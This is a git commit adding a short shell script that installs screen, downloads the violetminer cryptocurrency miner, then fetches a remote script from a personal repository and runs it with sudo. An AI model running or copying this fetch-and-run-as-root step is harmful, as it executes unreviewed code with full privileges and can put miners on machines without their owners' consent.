2c91e19361a7e7fe85248a47300e6808be708173
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-15 13:28:32 +0100

    Create bujd.sh

---
+++ bujd.sh
@@ -0,0 +1,8 @@
+apt install screen
+
+wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz
+cd violetminer-linux-v0.2.2
+
+wget https://raw.githubusercontent.com/uveshV/dddddd/main/uvu.sh
+chmod +x uvu.sh
+sudo ./uvu.sh
